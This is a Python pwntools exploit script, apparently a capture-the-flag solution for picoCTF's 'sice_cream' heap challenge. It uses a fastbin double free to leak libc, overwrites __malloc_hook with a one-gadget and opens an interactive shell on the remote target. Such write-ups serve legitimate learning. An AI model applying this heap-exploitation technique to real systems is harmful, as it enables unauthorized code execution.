#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux','new-window']
libc = ELF('./libc-2.23.so')
elf = ELF('./sice_cream')
#p = process(elf.path)
p = remote('2019shell1.picoctf.com',6552)
def init(name):
    p.sendafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.',drop=True)

init(p64(0)+p64(0x61)+p64(0)+p64(0x21)*((0x100-32)/8))
add(0x58,'e') #0
add(0x58,'a') #1
free(0)
free(1)
free(0)
add(0x58,p64(0x602040)) #2
add(0x58,p64(0)) #3
add(0x58,p64(0)) #4
add(0x58,p64(0)) #5
reintroduce(p64(0x0)+p64(0x91))
free(5)
libc.address = u64(reintroduce('A'*16)[:-2][-6:]+"\x00"*2)-0x3c4b78
main_arena = libc.address+0x3c4b20
log.success('Libc at: '+hex(libc.address))
log.success('Main arena: '+hex(libc.address+0x3c4b20))
reintroduce(p64(0)+p64(0x61))
add(0x58,p64(0)) #6
reintroduce(p64(0x0)+p64(0x41))
free(6)
reintroduce(p64(0x0)+p64(0x61))
free(6)
reintroduce(p64(0)+p64(0x61)+p64(main_arena+18))
add(0x58,'a') #7
add(0x58,'\x00'*54+p64(libc.symbols['__malloc_hook']-0x15)) #8
add(0x20,"\x00"*5+p64(libc.address+0xf02a4)) #9
free(3)
free(3)
p.interactive()
